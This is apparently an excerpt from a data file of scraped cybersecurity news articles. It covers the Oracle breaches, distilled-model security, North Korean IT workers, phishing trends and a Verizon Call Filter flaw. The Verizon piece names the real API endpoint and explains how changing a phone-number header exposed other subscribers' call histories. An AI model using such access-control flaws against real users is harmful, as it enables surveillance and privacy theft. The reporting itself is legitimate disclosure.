Quelle für ihre eigenen Konfigurationen sind.\nAuthentifizierung, Autorisierung und Buchführung (AAA) verwenden, um Konfigurationsänderungen für wichtige Geräteschutzmaßnahmen wie lokale Konten, TACACS+ und RADIUS zu verweigern.\nMonitoring der Umgebung auf ungewöhnliche Verhaltens- oder Konfigurationsänderungen, wie die Offenlegung von administrativen oder ungewöhnlichen Schnittstellen, sowie Protokolle auf ungewöhnliche Aktivitäten überwachen.\nBaselines für Geräteprofile erstellen, um Änderungen zu erkennen, und Fingerabdrücke von Netzwerkgeräten über NetFlow und Port-Scans erstellen, um Verschiebungen zu erkennen, einschließlich Änderungen beim Öffnen oder Schließen von Ports und beim ein- und ausgehenden Datenverkehr.

The total number of health-care providers that the hackers have sought to extort is also uncertain”.\nWhile the letter suggests the breach affected Cerner data before they were uploaded to Oracle Cloud and that it is an entirely unrelated incident, the same can’t be said in full confidence given the timing of the two incidents and the fact that the health data breach was done with stolen logins.\n“Available evidence suggests the threat actor illegally accessed the environment by using stolen customer credentials,” the letter reportedly added.\nOracle and the FBI office did not respond to requests for comments.\nOracle isn’t budging on Cloud breach denial\nCybersecurity firm CloudSEK first reported the cloud breach involving a threat actor “rose87168” selling six million records exfiltrated from single-sign-on (SSO) and Lightweight Directory Access Protocol (LDAP) of Oracle Cloud.\nWhile Oracle quickly denied the breach to media outlets, data shared as samples from the breach were validated by several Oracle customers. Additionally, the threat actor posted an archive.org URL (http://login.us2.oraclecloud.com) and demonstrated to the cybersecurity news channel Bleeping Computer they had write access to login.us2.oraclecloud.com, a login service using Oracle Access Manager.\nOracle has since\nrequested\nWayback Machine (Archive.org) to take down the archived URL. Independent cybersecurity\nresearchers\nare taking to the internet to criticize Oracle’s efforts at coverup. Meanwhile, the threat actor\nposted\na long video of an internal Oracle meeting, presumably from the breach, solidifying their claims.\n“In cybersecurity, denial doesn’t neutralize the danger, transparency does,” CloudSEK co-founder and CEO Rahul Sassi told CSO. “This investigation is not about blame, it’s about accountability. It’s about empowering every security team, every customer, and every vendor in the supply chain to act before attackers do.” Affected data from the breach included JKS files, encrypted SSO passwords, key files, and enterprise manager JPS keys, according to\nCloudSEK\n. While SSO passwords could be cracked with other breached files, LDAP passwords were encrypted and the threat actor, in their\npost\n, sought help with decoding them in exchange for some compromised data.\nRelated content\nNews\nYears-old login credential leads to leak of 270,000 Samsung customer records\nBy\nJulia Mutzbauer\n02 Apr 2025\n2 mins\nData Breach\nBrandpost\nSponsored by Fortinet\nThreat-informed defense for operational technology: Moving from information to action\nBy\nDerek Manky, chief security strategist and global VP of threat intelligence\n02 Apr 2025\n7 mins\nSecurity\nNews\nMicrosoft’s AI tool catches critical GRUB2, U-boot bootloader flaws\nBy\nGyana Swain\n02 Apr 2025\n6 mins\nGenerative AI\nSecurity\nVulnerabilities\nNews\nGoogle fixes GCP flaw that could expose sensitive container images\nBy\nShweta Sharma\n02 Apr 2025\n3 mins\nCloud Security\nSecurity\nVulnerabilities\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

Running these massive models, however, comes at a price. The high costs and latency associated with them make them impractical for many real-world scenarios.\nEnter model distillation. A technique AI engineers are using to pack the most useful aspects of these “high-parameter” models into much smaller rip-offs. They do this by training a smaller “student” model from the ground up to replicate the behavior of a larger “teacher” model.\n“Model distillation enables engineers to capture much of the operational capacity of a high-parameter model within the reduced computational footprint of a lower-parameter model,” said David Brauchler, technical director & head of AI and ML security at NCC Group. “Model distillation is most effective when the student model has a more limited purpose or knowledge domain than the generalized teacher model.”\nWhile distillation enables cost savings, faster inference, and better operational efficiency, distilled models inherit many security risks from their teacher models, along with a few others of their own.\nStudents take on the teacher’s burden\nDistilled models inherit a huge part of their teacher model’s behavior, including any security risks embedded in their training data. These risks include intellectual property theft, privacy leaks, and model inversion attacks.\n“Typical model distillation uses the training data originally consumed by the larger teacher model alongside the teacher model’s predictions of valid possible outputs (i.e. the probability distribution of outputs),” Brauchler said. “Consequently, the student model has the opportunity to memorize many of the same behaviors as the teacher model, including sensitive data in the training sets.”\nSecurity vulnerabilities of teacher models carry into the student through the transfer of latent knowledge, biases, and flaws. What this means is that DistilGPT-2, a student model to GPT-2, is equally capable of leaking personally identifiable information (PII) from its training data that GPT-2 was found\nguilty of in 2020\nwhen prompted in specific ways.\nThe same distillation is potentially prone to a model inversion attack through the black-box extraction techniques that GPT-3.5\nwas demonstrated vulnerable\nto in a study in 2020. Smaller models represent less complex functions and are often more vulnerable to security attacks such as model inversion, Brauchler added.\nPassed down wisdom can distort reality\nRather than developing their own contextual understanding, student models rely heavily on their teacher models’ pre-learned conclusions. Whether this limitation can lead to model hallucination is highly debated by experts.\nBrauchler is of the opinion that the efficiency of the student models is tied to that of their teachers, irrespective of the way they were trained. What this means is that if a teacher model isn’t hallucinated, chances are students won’t be either.\nAgreeing with most of that argument, Arun Chandrasekaran, VP Analyst at Gartner, clarifies student models may indeed suffer from newly introduced hallucinations with respect to their size and purpose.\n“Distillation itself does not necessarily increase the rate of hallucinations, but if the student model is significantly smaller, it might lack the capacity to capture all the nuances of the teacher model, potentially leading to more errors or oversimplifications,” Chandrasekaran said.\nWhen a model hallucinates, it can be exploited by threat actors to craft adversarial prompts that manipulate outputs, leading to misinformation campaigns or AI-driven exploits.\nAn instance of model hallucination used by miscreants is the\ndiscovery of WormGPT in 2023\n, an AI system deliberately trained on unverified, potentially biased, and adversarial data to hallucinate legal terminologies, business processes, and financial policies to create convincing but completely fabricated phishing emails and scam content.\nSnatch AI made easy\nDistilled models also lower the barriers for adversaries attempting\nmodel extraction attacks\n. By extensively querying these models, attackers can approximate their decision boundaries and recreate functionally similar models—often with reduced security constraints.\n“Once an adversary has extracted a model, they can potentially modify it to bypass security measures or proprietary guidelines embedded in the original model,” Chandrasekaran said. “This could include altering the model’s behavior to ignore certain inputs or to produce outputs that align with the adversary’s goals.”\nBrauchler, however, argues that bypassing an AI model’s proprietary security guardrails is not the primary driver behind model extraction attacks using distilled models. “Model extraction is usually exploited with the intent of capturing a proprietary model’s performance, not with the express purpose of bypassing guardrails,” he said. “There are much less strenuous techniques to avoid AI guardrails.”\nInstead of using a distilled model for extraction, he explained, threat actors may disguise a malicious model as a crispier version, given that model extraction attacks closely resemble model distillation.\nOne particular risk arises when proprietary models provide probability distributions (soft labels), as threat actors can leverage distillation methodologies to replicate the target model’s functional behavior. While similar attacks can be executed using only output labels, the absence of probability distributions significantly reduces their effectiveness, added Brauchler.\nTo sum up, distillation can potentially expose models to extraction, either by serving as a cover for replicating a source model’s behavior in an extraction attack or by enabling post-distillation extraction attempts with security bypasses.\nThey may not always have your back\nAnother downside to distillation is its interpretability. Large LLMs benefit from extensive logs and complex decision-making pathways that security teams can analyze for root cause investigation. Distilled models, however, often lack this granularity making it harder to diagnose vulnerabilities or trace security incidents.\n“In the context of incident response, the lack of detailed logs and parameters in student models can make it harder to perform root cause analysis,” Chandrasekaran said. “Security researchers might find it more difficult to pinpoint the exact conditions or inputs that led to a security incident or to understand how an adversary exploited a vulnerability.”\nThis opacity complicates defensive strategies and forces security teams to rely on external monitoring techniques rather than internal AI audit trails.\nFighting the AI curse\nWhile security risks from distilled models are quite pressing, the broader risk remains the nascent state of AI security itself, which is a key driver of all these vulnerabilities.\n“AI guardrails remain soft defense-in-depth controls, not security boundaries,” Brauchler noted. “And as systems move toward agentic contexts, the AI engineering industry will quickly discover that relying on guardrails will result in deep, impactful security vulnerabilities in critical systems, as NCC Group has already observed across multiple application environments.”\nOnly when developers change the way they think about AI application architectures, will we be able to move toward designing systems with trust-based access controls in mind, he added.\nRelated content\nOpinion\nAI disinformation didn’t upend 2024 elections, but the threat is very real\nBy\nChristopher Whyte\n03 Apr 2025\n9 mins\nCSO and CISO\nGenerative AI\nSecurity Practices\nBrandpost\nSponsored by Fortinet\nThreat-informed defense for operational technology: Moving from information to action\nBy\nDerek Manky, chief security strategist and global VP of threat intelligence\n02 Apr 2025\n7 mins\nSecurity\nNews\nMicrosoft’s AI tool catches critical GRUB2, U-boot bootloader flaws\nBy\nGyana Swain\n02 Apr 2025\n6 mins\nGenerative AI\nSecurity\nVulnerabilities\nNews\nGoogle fixes GCP flaw that could expose sensitive container images\nBy\nShweta Sharma\n02 Apr 2025\n3 mins\nCloud Security\nSecurity\nVulnerabilities\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

However, the organization believes it is now too risky to continue, given the changes in the ethical, political, and societal climate.\nHence, the project will shut down at the end of the month, and all user submissions will be wiped.\nThe announcement does not explicitly instruct users to take any action such as deleting their data, so no manual actions are required.\nHowever, those who want to keep a copy of their or other data for personal use have until April 30, 2025, to download it.\nThat said, anyone who has already downloaded the data has a copy forever, but removing the public, centralized source lowers discoverability and future access by scraping operations.\nTop 10 MITRE ATT&CK\n©\nTechniques Behind 93% of Attacks\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\nRead the Red Report 2025\nRelated Articles:\n23andMe files for bankruptcy, customers advised to delete DNA data\nMicrosoft uses AI to find flaws in GRUB2, U-Boot, Barebox bootloaders\nNew npm attack poisons local packages with backdoors\nNew Akira ransomware decryptor cracks encryptions keys using GPUs\nNew Chirp tool uses audio tones to transfer data between devices",

A paid version (Plus) adds a spam lookup and risk meter, the ability to apply blocks by type of caller, and receive caller ID on unknown numbers.\nThe free version of the app comes\npre-installed and enabled by default\non eligible Android and iOS devices bought directly from Verizon, and is believed to be used on millions of devices.\nConnelly told BleepingComputer that he only tested\nthe iOS app\n. However, he noted that\nthe Android app\nwas also very likely impacted by the same bug, as the issue was with the feature's API rather than the apps themselves.\nExposing call histories\nWhen using the Call Filter app, Connelly discovered that the app would connect to an API endpoint, https://clr-aqx.cequintvzwecid.com/clr/callLogRetrieval, to retrieve the logged-in user's incoming call history and display it in the app.\n\"This endpoint requires a JWT (JSON Web Token) in the Authorization header using the Bearer scheme and uses an X-Ceq-MDN header to specify a cell phone number to retrieve call history logs for,\" explains Connelly.\n\"A JWT has three parts: header, payload, and signature. It's often used for authentication and authorization in web apps.\"\nConnelly says the payload includes various data, including the phone number of the logged-in user making the request to the API.\nJWT payload\nSource: Connelly\nHowever, the researcher discovered that the phone number in the JWT payload for the logged-in user was not verified against the phone number whose incoming call logs were being requested.\nAs a result, any user could send requests using their own valid JWT token, but replace the X-Ceq-MDN header value with another Verizon phone to retrieve their incoming call history.\nExample request sent to the vulnerable API\nSource: evanconnelly.github.io\nThis flaw is particularly sensitive for high-value targets like politicians, journalists, and law enforcement agents, as their sources, contacts, and daily routines could be mapped out.\n\"Call metadata might seem harmless, but in the wrong hands, it becomes a powerful surveillance tool. With unrestricted access to another user's call history, an attacker could reconstruct daily routines, identify frequent contacts, and infer personal relationships,\" explained Connelly.\nIt is unclear if rate limiting was in place to prevent mass scraping for millions of subscribers, but Connolly told BleepingComputer he saw no indication of such a mechanism or an API gateway that usually implements a security feature like this.\nPoor security practices\nAlthough the researcher commends Verizon for its prompt response to his disclosure, he highlighted worrying practices the telecom firm has followed in handling subscribers' call data.\nThe vulnerable API endpoint used by Call Filter appears to be hosted on a server owned by a separate telecommunications technology firm called Cequint, which specializes in caller identification services.\nCequint's own website is offline, and public information about them is limited, raising concerns about how sensitive Verizon call data is handled.\nBleepingComputer contacted Verizon to ask when the flaw was introduced, if it was seen exploited in the past, and if it impacted all Call Filter users but has not received a response at this time.\nTop 10 MITRE ATT&CK\n©\nTechniques Behind 93% of Attacks\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\nRead the Red Report 2025\nRelated Articles:\nCrypto-stealing apps found in Apple App Store for the first time\nApple backports zero-day patches to older iPhones and Macs\nNew Android malware uses Microsoft’s .NET MAUI to evade detection\nMalicious Android 'Vapor' apps on Google Play installed 60 million times\nNew North Korean Android spyware slips onto Google Play",

        "content": "The Reality Behind Security Control Failures—And How to Prevent Them\nSponsored by\nOnDefend\nApril 2, 2025\n10:01 AM\n0\nThere’s a clear gap between expectation and reality when it comes to security controls.\nDespite deploying best-in-class security tools and building capable teams, many organizations discover the truth only after a breach: their controls weren’t working as expected.\nThink of changing a lightbulb—you turn it on to check if it works. Security controls rarely get the same validation. Instead, success criteria become “don’t break production,” which doesn’t actually test whether the security controls are effective.\nIt’s not for lack of trying, but traditional methods—such as compliance audits and penetration tests—don’t fully answer the question, “\nWould we win?\n” if attacked.\nAs a result, blind spots persist.\nTraditional Security Testing Falls Short\nCompliance audits\nfocus on policy and process but rarely engage in operational assurance testing that confirms, “\nDoes this actually work as expected?\n”\nAnswering “Do you have antivirus software?” is very different from “How long does it take for a malicious file to be removed and your team to be alerted?”\nPenetration tests can highlight security gaps but often reflect a specific attack path chosen by the testers rather than a comprehensive evaluation of all potential failure points.\nThe end result? Gaps (or blind spots) that typically aren’t discovered until someone else finds them for you.\nFive Most Common Reasons Security Controls Fail\nFailures occur in both security tools—such as Secure Email Gateways (SEGs), Endpoint Detection and Response (EDR), and Security Information and Event Management (SIEM) systems—and in security teams, whether in-house or managed detection and response (MDR) providers.\nWe can categorize these into organizations threat prevention, detection, and response investments.\nA Case Study: How a Leading Healthcare System Proactively Removed Security Control Failures\nLearn how OnDefend’s BlindSPOT breach and attack simulation (BAS) managed service helped a major U.S. healthcare provider validate security controls, hold vendors accountable, reduce risk and protect patient data.\nDownload the Case Study\nTop Five Causes of Threat Prevention, Detection, and Response Failures\nPolicy Sprawl –\nOften the ideal policy from a security perspective clashes with the needs for authorized activity. This means your population within the security tool gets spread across a variety of policies with different settings and rules, often with significant differences to the overall performance. We often see organizations develop very well-crafted policies for their EDR tools and then realize that the majority of the fleet population is in the default policy, missing the opportunity to capitalize on the work performed by the team.\nUnintended Config Changes\n– False positive alerts consume most of a SOC analysts time.  What if the configuration changes to reduce this noise accidentally silences true positive events as well?  Errors in the alert query or accidentally applying the exception to all systems happen frequently.\nAbility to Execute the Playbook –\nMost organizations have done an excellent job building their threat hunting and incident response playbooks.  But do the analysts ever get a chance to execute those activities in production?  If you have an expectation that a SOC analyst can execute a fleet-wide hunt for a file with a given hash value, chances are not everyone on the team can do that correctly without ongoing training.\nUndersized Deployment –\nThe security tool deployment fit initially, but as the environment grows, do they have the capacity and licensing to keep up? It’s not uncommon for undersized deployments to result in very long processing times, which translates to delays in your team being alerted to malicious activity, sometimes hours.\nReal-World Example\nA customer had added some new data sources to the collected telemetry, these new logs coming from end-user devices across the fleet.  The sudden increase in logging overwhelmed the SIEM (Security Information and Event Management) system they had, creating a massive backlog of logs to be processed.  The alerts they were looking for would arrive – 6 hours after the event had occurred. It was only when automated testing was introduced that this issue was discovered.\nChanges around the Tools –\nOften the security tool itself works great – but the environment around the tooling has changed to the point that the tool is no longer effective.\nReal-World Example\nAn organization hired a third party for security monitoring, including a network IDS analyzing traffic from core routers. After an attack went undetected, they asked the vendor why—only to learn a network change months earlier had cut off traffic to the IDS. Despite receiving no data for months, it never triggered an alert or error.\nThe Need for Continuous Validation\nThe only way to combat these failures is by regularly testing security detection processes. To scale this effectively, control tests must be automated pointing out defects while cataloging successes and calculating key metrics such as\nMean Time to Detect (MTTD)\nand\nMean Time to Respond (MTTR)\n.\nTransitioning Continuous Testing Mindset\nManaged Breach & Attack Simulation (BAS) services provide ongoing assurance without adding operational burden. When combined with penetration testing, BAS ensures a more comprehensive security strategy.\nHolding vendors accountable is another key step—continuous testing provides data-driven evidence to measure vendor performance against SLAs, helping organizations demand better service, renegotiate contracts, or compare solutions before making purchasing decisions. Lastly, security leaders must communicate their effectiveness in business terms, using metrics like detection rates, response times, and financial risk reduction to quantify security’s value and in some cases leverage that data to lower cyber insurance premiums.\nTrust but Verify Your Security Investments Will Work\nSecurity leaders have always sought assurance that their cybersecurity investments perform as intended. With corporate stakeholders demanding measurable proof, continuous security validation bridges security, risk reduction, and business objectives—turning cybersecurity from a cost center into a strategic enabler.\nOnDefend’s Ransomware Defense Validation\nmanaged service enables security teams to continuously test and validate their security controls, ensuring real-time visibility into potential blind spots.\nDon’t let the bad guys do the validating for you.

So it is no surprise that we are seeing some exploit activity,\" Ullrich said.\nOn Monday, CISA added the CVE-2024-20439 static credential vulnerability to its\nKnown Exploited Vulnerabilities Catalog\n, ordering U.S. federal agencies to secure their systems against active exploitation within three weeks, by April 21.\nThis isn't the first backdoor account removed from Cisco products in recent years, with previous hardcoded credentials found in its\nIOS XE\n,\nWide Area Application Services (WAAS)\n,\nDigital Network Architecture (DNA) Center\n, and\nEmergency Responder\nsoftware.\nTop 10 MITRE ATT&CK\n©\nTechniques Behind 93% of Attacks\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\nRead the Red Report 2025\nRelated Articles:\nCritical Cisco Smart Licensing Utility flaws now exploited in attacks\nCISA tags Windows, Cisco vulnerabilities as actively exploited\nNew Windows zero-day exploited by 11 state hacking groups since 2017\nMicrosoft patches Windows Kernel zero-day exploited since 2023\nCritical PHP RCE vulnerability mass exploited in new attacks",

However, now it will continue using your created local account and will not prompt you to use a Microsoft Account.\nWhen done installing, you can confirm a local account is being used by clicking on the Start button and then clicking on your account name, as shown below.\nWindows 11 configured to use a local account\nSource: BleepingComputer\nAs you can see, this command makes it much easier to use a local account when setting up Windows 11, even compared to the previous BypassNRO method.\nWhether Microsoft will remove this command from Windows in the future is too early to tell.\nHowever, as the start ms-cxh:localonly command appears to be more tightly integrated into the operating system, rather than just a script, it will likely be harder to remove.\nTop 10 MITRE ATT&CK\n©\nTechniques Behind 93% of Attacks\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\nRead the Red Report 2025\nRelated Articles:\nMicrosoft's killing script used to avoid Microsoft Account in Windows 11\nMicrosoft adds hotpatching support to Windows 11 Enterprise\nMicrosoft tests new Windows 11 tool to remotely fix boot crashes\nWindows 11 update breaks Veeam recovery, causes connection errors\nWindows Notepad to get AI text summarization in Windows 11",

        "content": "North Korean IT worker army expands operations in Europe\nBy\nSergiu Gatlan\nApril 1, 2025\n02:55 PM\n0\n​North Korea's IT workers have expanded operations beyond the United States and are now increasingly targeting organizations across Europe.\nAlso referred to as \"IT warriors,\" they hide their true identities and pose as workers based in other countries by connecting via laptop farms to fraudulently secure positions as remote freelance IT employees at companies worldwide to generate revenue for the Democratic People's Republic of Korea (DPRK) regime.\nAs security researchers with the Google Threat Intelligence Group (GTIG) found, North Korea's IT army has increasingly targeted positions at companies in Germany, Portugal, and the United Kingdom after many of its members have been charged and targeted with sanctions in the United States.\n\"In their efforts to secure these positions, DPRK IT workers employed deceptive tactics, falsely claiming nationalities from a diverse set of countries, including Italy, Japan, Malaysia, Singapore, Ukraine, the United States, and Vietnam. The identities used were a combination of real and fabricated personas,\"\nsaid Jamie Collier\n, a lead threat intelligence advisor at GTIG.\n\"IT workers in Europe were recruited through various online platforms, including Upwork, Telegram, and Freelancer. Payment for their services was facilitated through cryptocurrency, the TransferWise service, and Payoneer, highlighting the use of methods that obfuscate the origin and destination of funds.\"\nCountries targeted by DPRK IT workers (GTIG)\n​For instance, GTIG investigators discovered user credentials at European job websites and human capital management platforms linked to DRPK IT worker personas looking for employment at German and Portuguese companies. North Korean IT workers have also been linked to many projects in the United Kingdom, ranging from AI and blockchain technology to web, bot, and content management system (CMS) development.\nAnother DPRK IT worker targeted multiple European organizations in the defense industrial base and government sectors in late 2024 using fabricated references and personas to make it easier to trick job recruiters into hiring them.\n\"We are increasingly seeing North Korean IT workers infiltrating larger organizations to steal sensitive data and follow through on their extortion threats against these enterprises,\" Michael Barnhart, a Mandiant Principal Analyst at Google Cloud, told BleepingComputer in January.\n\"It's also unsurprising to see them expanding their operations into Europe to replicate their success, as it's easier to entrap citizens who aren't familiar with their ploy.\"\nOn September 12, 2024, the United Kingdom's Office of Financial Sanctions Implementation\nissued an advisory on North Korean IT workers\nwith info on how potential targets can mitigate their risk exposure and warning that individuals and organizations who hire them could be breaching\nfinancial sanctions\n.\nU.S. crackdown on DPRK IT work schemes\nGTIG's report follows\nmultiple warnings\nissued by the FBI regarding North Korea's\nmassive army of IT workers\nsent abroad to generate revenue, who have tricked\nhundreds of companies\nin the United States and worldwide into hiring them over the years. However, the North Korean regime keeps up to 90% of wages collected this way, generating hundreds of millions every year to fund its weapons programs.\nAfter being discovered and fired, some of these undercover North Korean IT workers have also used insider knowledge to\nextort former employers\n, threatening to leak sensitive information stolen from company systems.\nIn January, the U.S. Justice Department\nindicted two North Korean nationals\nand three facilitators for their involvement in a multi-year fraudulent remote IT work scheme involving at least sixty-four U.S. companies between April 2018 and August 2024.\nThe Treasury's Office of Foreign Assets Control (OFAC)\nalso sanctioned North Korean front companies\nlinked to North Korea's Ministry of National Defense and accused of generating revenue via illegal remote IT work schemes. The U.S. State Department now\noffers millions in exchange for any information\nthat could help disrupt their fraudulent activities.\nIn recent years,\nSouth Korean\nand\nJapanese\ngovernment agencies have also issued alerts on North Koreans impersonating people from other countries to secure employment as remote IT workers at private companies.\nTop 10 MITRE ATT&CK\n©\nTechniques Behind 93% of Attacks\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\nRead the Red Report 2025\nRelated Articles:\nNorth Korean hackers adopt ClickFix attacks to target crypto firms\nOKX suspends DEX aggregator after Lazarus hackers try to launder funds\nNew North Korean Android spyware slips onto Google Play\nNorth Korean Lazarus hackers infect hundreds via npm packages\nMicrosoft: North Korean hackers join Qilin ransomware gang",

        "content": "Zeljka Zorz\n, Editor-in-Chief, Help Net Security\nApril 3, 2025\nShare\nPhishers are increasingly impersonating electronic toll collection companies\nSteam was the most imitated brands by phishers in the first quarter of 2025, followed by Microsoft and Facebook/Meta, Guardio researchers have revealed.\n“Historically, the #1 spot has been dominated by the usual suspects – big tech companies like Meta, Microsoft, or even USPS. But this quarter, it’s Steam, and by a significant margin. Scammers have been targeting the massive gaming community by impersonating Steam to warn users about supposed account issues, like payment failures or suspicious login attempts. These fake messages are designed to trick victims into entering their login credentials on counterfeit websites, which then steal their account information,” the researchers noted.\n“If you get an unexpected email or text about your Steam account or a supposed gift card reward, always double-check the URL and resist clicking on any links until you’re absolutely sure it’s legitimate.”\nElectronic toll collection-related phishing surges\nThe top 10 most imitated brands in Q1 2025 were, according to the company:\n1. Steam\n(digital game distribution service by Valve)\n2. Microsoft\n3. Facebook/Meta\n4. Roblox\n(online game platform and game creation system)\n5. SunPass\n(electronic toll collection company)\n6. E-ZPass\n(electronic toll collection company)\n7. USPS\n(US Postal Service)\n8. EZDrive Massachusetts\n(electronic toll collection company)\n9. Netflix\n(streaming service)\n10. WeTransfer\n(file transfer service)\nThe most interesting thing here is that three separate US electronic toll collection companies made it into the list.\n“Scammers have been sending out text messages claiming you have an unpaid toll fee, directing victims to fake websites designed to steal sensitive information. Guardio detected a staggering 604% increase in toll fee scam texts since the start of the year, with March seeing a 98% jump in scam activity from the previous week alone,” the researchers\nsaid\n.\nThis surge is most likely related to the popularity of phishing-as-a-service (PhaaS) platforms like\nDarcula\nand\nLucid\n, which include phishing templates designed to impersonate postal services, courier companies, road toll systems, and tax refund agencies around the world and allow users to easily generate a phishing kit for any brand.\n“The [Lucid] platform employs an automated attack delivery mechanism, deploying customizable phishing websites distributed primarily through SMS-based lures. To enhance effectiveness, Lucid leverages Apple iMessage and Android’s RCS technology, bypassing traditional SMS spam filters and significantly increasing delivery and success rates,” Prodaft researchers recently explained.\nAnother interesting trend is phishers impersonating popular fashion brands that announced store closures: Forever 21 (after filing for Chapter 11 bankruptcy in March 2025) and JOANN (in February 2025, after the company failed to obtain a buyer).\n“Knowing shoppers are familiar with ‘going out of business’ sales, they created fake ads and websites to lure people into entering payment information for goods that will never arrive,” Guardio researchers noted.\nSubscribe to our breaking news e-mail alert to never miss out on the latest breaches, vulnerabilities and cybersecurity threats.\nSubscribe here!\nMore about\ncybercrime\nFacebook\nGuardio\nMicrosoft\nphishing\nProdaft\nscams\nSteam\nShare",

With cybercrime costs expected to reach $10.5 trillion annually by 2025, marking a 15% year-over-year increase, organizations urgently need a solution that surpasses traditional security methods.\nOver the past two years, 77,000 organizations have rapidly adopted AI coding assistants, despite research showing that AI-assisted coding tools like GitHub Copilot introduce ~29% more security vulnerabilities. Additionally, developers are increasingly “vibe coding” with LLMs increasingly without conducting thorough reviews of their changes.\nConcurrently, cybercriminals have adopted sophisticated AI-driven techniques, including prompt injection attacks and malicious code embedded in AI models and software packages, exacerbating the threat landscape.\nFurthermore, security teams are increasingly understaffed to conduct manual code reviews, with the current ratio often at 1 security engineer per 200 developers, far from the ideal. This disparity, coupled with the high false-positive rates of traditional SAST tools (exceeding 20%), has significantly hindered effective vulnerability management.\nCorgea is making its BLAST scanner publicly available to address these challenges through:\nAI-driven vulnerability detection:\nBLAST leverages advanced AI and contextual analysis to uncover vulnerabilities traditional scanners and human reviewers miss, while significantly reducing false positives and alert fatigue.\nAutomated code remediation:\nAutomatically generates and applies secure fixes, streamlining workflows and easing the burden on developers and security teams. Corgea was recently recognized as an IDC Innovator and named a Leader by Latio in automated code remediation.\nScalable Security integration:\nBLAST dynamically integrates into existing development environments, scaling seamlessly to proactively manage threats and ensure robust protection for organizations facing growing regulatory demands.\nAhmad Sadeddin\n, CEO of Corgea, stated “Organizations are rapidly adopting AI coding assistants, prioritizing speed over security—until it’s too late. BLAST changes that dynamic. By leveraging AI-driven cybersecurity combined with deep code analysis, we offer real-time, actionable vulnerability detection and fixes. Our goal isn’t merely breach prevention; it’s about allowing companies to accelerate software development without compromising on security.”\nAl Ghous\n, CISO and advisor, added, “The introduction of BLAST represents a significant leap forward in application security.

        "content": "Dotan Nahum, Head of Developer-First Security, Check Point Software\nApril 3, 2025\nShare\n7 ways to get C-suite buy-in on that new cybersecurity tool\nYou’re in the middle of a sprint, juggling deadlines, debugging code, fine-tuning pipelines, and then it happens—you stumble across the perfect cybersecurity tool. It promises to eliminate secrets in logs, reduce risks in CI/CD pipelines, and save countless hours chasing security anomalies.\nBut there’s one final boss to clear: the C-suite. Convincing leadership, especially those more attuned to balance sheets than breach reports, can feel like selling a Wi-Fi router to someone without any internet connection. Securing buy-in is not just a technical challenge. It’s a game of strategy, storytelling, and persuasion. Here’s how to win them over.\n1. Lead with business value, not features\nExecutives care about outcomes, such as cost savings, operational efficiency, and competitive edge. Therefore, you can start by framing the tool as a business enabler, not a technical upgrade.\nFor instance, ensuring business continuity through advanced threat detection isn’t just a technical win—it directly boosts revenue. Every minute of downtime costs an organization thousands, if not millions, in lost sales and damaged customer trust. A cybersecurity tool that proactively identifies vulnerabilities safeguards revenue streams and ensures uninterrupted operations.\n2. Paint a clear picture of what’s at stake\nThe risks of inaction are mounting in light of new regulations such as the EU’s\nCyber Resilience Act\n, and the consequences can be devastating. Data is your ultimate sidekick in highlighting security breaches’ financial, operational, and reputational costs.\nFor smaller organizations, a breach can be existential, eroding trust and crippling operations overnight. You can shift the narrative toward resilience and stability by framing cybersecurity investments as essential safeguards rather than optional expenses. After all, it’s unlikely that the C-suite will want to gamble with the cost of a data breach.\n3. Turn metrics into stories executives care about\nNumbers alone don’t persuade; stories do. To capture attention, translate raw metrics into compelling narratives about how the tool delivers measurable outcomes.\nStart with ROI. For instance, if the tool reduces detection and response times from five hours to one, reclaiming four hours per incident, and your team handles 100 incidents annually, the value becomes tangible. Link these savings to broader goals like team efficiency, faster product launches, or improved customer satisfaction to strengthen your case.\n4. Build alliances for stronger buy-in\nSuccess is rarely achieved alone. Engage stakeholders from compliance, finance, and other departments who share an interest in the tool’s benefits. The more voices supporting your pitch, the harder it becomes for leadership to dismiss.\nCompliance might champion automated reporting capabilities for\nrisk assessments\n, while finance appreciates risk reduction. By aligning your pitch with their priorities, you demonstrate the tool’s value across the organization and create a unified front.\n5. Frame security as a catalyst for innovation\nModern development pipelines thrive on speed, but without robust security measures baked in, they’re liabilities waiting to happen. Proactive security tools enable teams to innovate confidently by embedding protection into workflows.\nFor example, a\nsecrets detection tool\nthat flags exposed credentials prevents leaks and accelerates deployment cycles. It allows developers to focus on building new features, giving the organization a competitive edge. Positioning security as a growth enabler reframes it from a cost center to a driver of innovation.\n6. Tackle the cost conversation with a cost vs. value pitch\nBe upfront about costs but pivot to the value they deliver. Compare the price of the tool to the potential fallout of doing nothing. For instance, a $75,000 annual investment pales compared to a $4 million breach.\nYou can also benchmark industry standards to provide context. Highlight avoided expenses, such as reducing incidents or minimizing downtime, and connect those savings to reinvestment opportunities. A tool that pays for itself through improved efficiency and risk reduction becomes an obvious choice.\n7. Highlight ease of implementation\nOne of the biggest hurdles to gaining buy-in for new tools is the fear of disruption. Executives worry about how the implementation process will impact existing workflows, drain resources, or stall productivity. Addressing these concerns head-on is essential. By emphasizing the ease of implementation and the support available, you can position your tool as a seamless addition to the organization’s ecosystem, delivering quick wins with minimal friction.\nStart by showcasing features that simplify integration. Does the tool work out of the box with existing platforms, like\nCI/CD pipelines\nor cloud services? Highlight pre-built integrations that eliminate the need for custom coding or extensive configuration. For example, “This tool connects directly to GitHub and Jenkins, requiring no additional infrastructure changes. It is designed to fit our current workflows, not disrupt them.”\nSecuring buy-in is the path forward\nUltimately, the key is to speak the C-suite’s language, one that prioritizes outcomes over features, strategy over tactics, and growth over stagnation. Cybersecurity is 